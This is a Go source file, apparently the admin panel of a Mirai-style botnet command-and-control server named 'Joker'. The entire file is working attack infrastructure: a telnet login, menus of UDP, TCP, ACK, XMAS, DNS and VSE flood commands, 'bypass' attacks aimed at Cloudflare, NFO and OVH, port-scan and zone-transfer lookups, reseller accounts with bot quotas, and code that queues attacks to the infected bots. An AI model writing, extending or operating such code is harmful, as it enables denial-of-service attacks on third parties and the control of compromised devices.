package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
	
    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;32m ▐▄▄▄      ▄ •▄ ▄▄▄ .▄▄▄  \r\n"))
    this.conn.Write([]byte("\x1b[1;35m  ·██▪     █▌▄▌▪▀▄.▀·▀▄ █·\r\n"))
    this.conn.Write([]byte("\x1b[1;32m▪▄ ██ ▄█▀▄ ▐▀▀▄·▐▀▀▪▄▐▀▀▄ \r\n"))
    this.conn.Write([]byte("\x1b[1;35m▐▌▐█▌▐█▌.▐▌▐█.█▌▐█▄▄▌▐█•█▌\r\n"))
    this.conn.Write([]byte("\x1b[1;32m ▀▀▀• ▀█▄▀▪·▀  ▀ ▀▀▀ .▀  ▀\r\n"))
    this.conn.Write([]byte("\x1b[1;35mUsername\x1b[1;35m: \x1b[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;32mPassword\x1b[1;32m: \x1b[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;32mInvalid Credentials. Joker On Ur Way!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d Clowns | Joker | Clown: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m ╦\x1b[1;32m╔═╗\x1b[1;35m╦╔═\x1b[1;32m╔═╗\x1b[1;35m╦═╗\x1b[0m\r\n"))    
    this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m ║\x1b[1;32m║ ║\x1b[1;35m╠╩╗\x1b[1;32m║╣ \x1b[1;35m╠╦╝\x1b[0m\r\n"))    
    this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╚╝\x1b[1;32m╚═╝\x1b[1;35m╩ ╩\x1b[1;32m╚═╝\x1b[1;35m╩╚═\x1b[0m\r\n"))    
    this.conn.Write([]byte("\x1b[90m                                  We are all clowns                                                     \r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;32mJoker\x1b[35m~# "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m ╦\x1b[1;32m╔═╗\x1b[1;35m╦╔═\x1b[1;32m╔═╗\x1b[1;35m╦═╗\x1b[0m\r\n"))        
    this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m ║\x1b[1;32m║ ║\x1b[1;35m╠╩╗\x1b[1;32m║╣ \x1b[1;35m╠╦╝\x1b[0m\r\n"))       
    this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╚╝\x1b[1;32m╚═╝\x1b[1;35m╩ ╩\x1b[1;32m╚═╝\x1b[1;35m╩╚═\x1b[0m\r\n"))                                       
	this.conn.Write([]byte("\x1b[90m                                  We are all clowns                                                     \r\n"))
    continue
		}	

        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\x1b[1;90m            --> | Help | <--     \r\n"))            
			this.conn.Write([]byte("\x1b[1;35m╔═════════════════════════════════════╗\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m║ ports  \x1b[90m- \x1b[0mShows Ports                \x1b[1;35m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m║ bypass  \x1b[90m- \x1b[0mShows Bypass Commands     \x1b[1;35m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ methods \x1b[90m- \x1b[0mShows Attack Commands     \x1b[1;32m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ admin   \x1b[90m- \x1b[0mShows Admin Commands      \x1b[1;32m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m╚═════════════════════════════════════╝\x1b[0m\r\n"))
            continue
        }

        if err != nil || cmd == "ADMIN" || cmd == "admin" {
            this.conn.Write([]byte("\x1b[1;90m          --> | Admin HUB | <-- \r\n"))            
            this.conn.Write([]byte("\x1b[1;35m╔═════════════════════════════════════╗\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m║ adduser \x1b[90m- \x1b[0mCreate a Regular Account  \x1b[1;35m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ addadmin \x1b[90m- \x1b[0mCreate an Admin Account  \x1b[1;32m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m║ deluser \x1b[90m- \x1b[0mRemove an Account         \x1b[1;35m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚═════════════════════════════════════╝\x1b[0m\r\n"))
            continue
        }

        if err != nil || cmd == "METHODS" || cmd == "methods" {
            this.conn.Write([]byte("\x1b[1;90m                --> | Methods | <--                 \r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔═════════════════════════════════════════════════╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ udp [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mUDP Flood        \x1b[1;35m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ std [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mSTD Flood        \x1b[1;32m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ tcp [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mTCP Flood        \x1b[1;35m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ dns [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mDNS Flood        \x1b[1;32m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ vse  [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mR6 Flood        \x1b[1;35m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ ack [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mACK FLood        \x1b[1;35m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ xmas [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mXMAS Flood      \x1b[1;32m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;35m╚═════════════════════════════════════════════════╝\x1b[0m\r\n"))
            continue
        }

        if err != nil || cmd == "bypass" || cmd == "BYPASS" {
            this.conn.Write([]byte("\x1b[1;90m                --> | Bypasses | <--               \r\n"))
            this.conn.Write([]byte("\x1b[1;32m╔═════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ cf [IP] [TIME] domain=[DOMAIN]   - CF Bypass.   ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ nfolag [IP] [TIME] dport=[PORT]  - NFO lag.     ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ ovhnuke [IP] [TIME] dport=[PORT] - OVH Nuke.    ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m╠═══════════════╦═══════════╦═════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ CF Port: 80   ║ Version v1║  --> | Rules | <--  ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ NFO Port: 22  ║  @iotnet  ╠═════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ OVH Port: 995 ║  @oesuo_  ║---Made By @iotnet---║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m╠═══════════════╩═══════════╩╗    Don't spam!     ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m║ iplookup - Looks up an IP  ║    Don't share!    ║\r\n"))
			this.conn.Write([]byte("\x1b[1;32m║ portscan - Portscans an IP ║    Don't Bother    ║\r\n"))
			this.conn.Write([]byte("\x1b[1;35m╚════════════════════════════╩════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "PORTS" || cmd == "ports" {
            this.conn.Write([]byte("\x1b[1;90m     --> | Ports | <--               \r\n"))
            this.conn.Write([]byte("\x1b[1;32m╔═════════════════════════╗\r\n"))
        	this.conn.Write([]byte("\x1b[1;35m║ PORT: 21 = SFTP         ║\r\n"))
        	this.conn.Write([]byte("\x1b[1;32m║ PORT: 22 = SSH          ║\r\n"))
        	this.conn.Write([]byte("\x1b[1;35m║ PORT: 23 = TELNET       ║\r\n"))
        	this.conn.Write([]byte("\x1b[1;32m║ PORT: 25 = SMTP         ║\r\n"))
        	this.conn.Write([]byte("\x1b[1;35m║ PORT: 53 = DNS          ║\r\n"))
        	this.conn.Write([]byte("\x1b[1;32m║ PORT: 69 = TFTP         ║\r\n"))
        	this.conn.Write([]byte("\x1b[1;35m║ PORT: 80 = HTTP         ║\r\n"))
        	this.conn.Write([]byte("\x1b[1;32m║ PORT: 443 = HTTPS       ║\r\n"))
        	this.conn.Write([]byte("\x1b[1;35m║ PORT: 3074 = XBOX       ║\r\n"))
        	this.conn.Write([]byte("\x1b[1;32m║ PORT: 5060 = RTP        ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ PORT: 9307 = PLAYSTATION║\r\n"))
        	this.conn.Write([]byte("\x1b[1;35m╚═════════════════════════╝\r\n"))
            continue
        }

            if err != nil || cmd == "IPLOOKUP" || cmd == "iplookup" {
            this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

        if err != nil || cmd == "PORTSCAN" || cmd == "portscan" {                  
            this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mError... IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/WHOIS" || cmd == "/whois" {
            this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/PING" || cmd == "/ping" {
            this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResponse\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

        if err != nil || cmd == "/traceroute" || cmd == "/TRACEROUTE" {                  
            this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mError... IP Address/Host Name Only!033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

        if err != nil || cmd == "/resolve" || cmd == "/RESOLVE" {                  
            this.conn.Write([]byte("\x1b[1;32mURL (Without www.)\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/reversedns" || cmd == "/REVERSEDNS" {
            this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/asnlookup" || cmd == "/asnlookup" {
            this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
            this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
            this.conn.Write([]byte("\x1b[1;32mIPv4 Or Website (Without www.)\x1b[1;32m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[1;32mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;32mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;32mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;32mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;32m- New User Info - \r\n- Username - \x1b[1;32m" + new_un + "\r\n\033[0m- Password - \x1b[1;32m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;32m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;32m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;32m" + cooldown_str + "   \r\n\x1b[1;32mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;32mUser Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "deluser" {
            this.conn.Write([]byte("\x1b[1;32mUsername: \x1b[0m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \x1b[1;32mAre You Sure You Want To Remove \x1b[1;32m" + rm_un + "\x1b[1;32m?(y/n): \x1b[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;32mUnable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\x1b[1;32mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\x1b[1;32mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;32mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;32mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;32mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;32m- New User Info - \r\n- Username - \x1b[1;32m" + new_un + "\r\n\033[0m- Password - \x1b[1;32m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;32m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;32m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;32m" + cooldown_str + "   \r\n\x1b[1;32mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;32mAdmin Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m%s \x1b[0m[\x1b[1;32m%d\x1b[0m]\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mTotal \x1b[0m[\x1b[1;32m%d\x1b[0m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 999999)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
